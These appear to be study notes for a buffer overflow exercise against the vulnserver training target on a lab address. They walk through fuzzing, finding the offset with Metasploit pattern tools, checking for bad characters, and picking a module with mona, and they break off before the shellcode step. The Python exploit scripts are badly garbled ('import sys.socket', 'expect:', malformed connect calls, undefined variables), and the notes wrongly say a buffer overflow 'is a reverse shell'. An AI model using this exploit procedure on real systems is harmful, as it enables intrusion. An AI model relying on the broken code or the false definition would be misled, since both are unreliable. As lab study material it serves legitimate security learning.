### Anatomy of the stack
---
- top
	- Extended Stack Pointer
	- Buffer Space
	- Extended Base Pointer
	- Extended Instruction Pointer/ Return Address
- Bottom 

Bufferover flow is a reverse shell

### Steps to conduct a buffer overflow
---
1. Fuzzing (spiking)
2. Finding the Offset
3. Overwriting the EIP
4. Finding the Bad Characters
5. Finding the Right Module
6. Generating Shellcode
7. Root!


### Spiking 
---
- Turn off windows defender 
- run vulnserver
- open immunity debugger
	- attach the vuln server
	- hit play
- kali 
	- nc to the ip address
	- ``` $ nc -nv 192.168.138.133 9999```
	- trun.spk
	``` 
		s_readline()
		s_string("TRUN ");
		s_string_variable("0");
	```
	- stats.spk
	```
		s_readline()
		s_string("STATS ");
		s_string_variable("0");
	```
	- ```$ generic_send_tcp $ip 9999 stats.spk 0 0```
	- ```$ generic_send_tcp $ip 9999 trun.spk 0 0```


### Where do we crash the server
---
- 1.py
```
#!/usr/bin/python3

import sys.socket
from time import sleep

buffer = "A"*100

while true:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.138.133, 9999'))
		payload = "TRUN /.:/"+buffer
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	expect: 
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
```
- ctrl c
	- fuzzing crashed at 2400 bytes
	- /usr/share/metasploit-framework/tools/exploit/patten_create.rb -l 2400
	- copy the output
	- cp 1.py 2.py

2.py 
```
#!/usr/bin/python3

import sys.socket
from time import sleep

OFFSET = # PASTED FROM PATTERN_CREATE.RB

while true:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.138.133, 9999'))
		payload = "TRUN /.:/"+OFFSET
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	expect: 
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
```

- pattern_offset.rb -1 2400 -q $eip
	- exact match at offset 2003

- copy 2.py 3.py


3.py
```

#!/usr/bin/python3

import sys.socket
from time import sleep

shellcode = "A"*2003 +"B"*4

while true:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.138.133, 9999'))
		s.send((payload.encode()))
		s.close()

	expect: 
		print("Error connecting to server")
		sys.exit()
```

Looking for bad characters 
copy 3.py 4.py
https://github.com/cytopia/badchars

```
#!/usr/bin/python3

import sys.socket
from time import sleep

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
shellcode = "A"*2003 +"B"*4 + badchars


while true:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.138.133, 9999'))
		s.send((payload.encode()))
		s.close()

	expect: 
		print("Error connecting to server")
		sys.exit()

```


looking for characters that are off

### Finding the right module
- !mona modules
- looking for something that doesn't have memory protection
	- anything that says false 
- !mona jmp -r ESP -m "essfunc.dll" 


- cp 4.py 5.py
```
#!/usr/bin/python3

import sys.socket
from time import sleep

shellcode = b"A"*2003 +"B"*4 + "\xaf\x11\x50\x62"


while true:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.138.133, 9999'))
		s.send((b")
		s.close()

	expect: 
		print("Error connecting to server")
		sys.exit()
```


- cp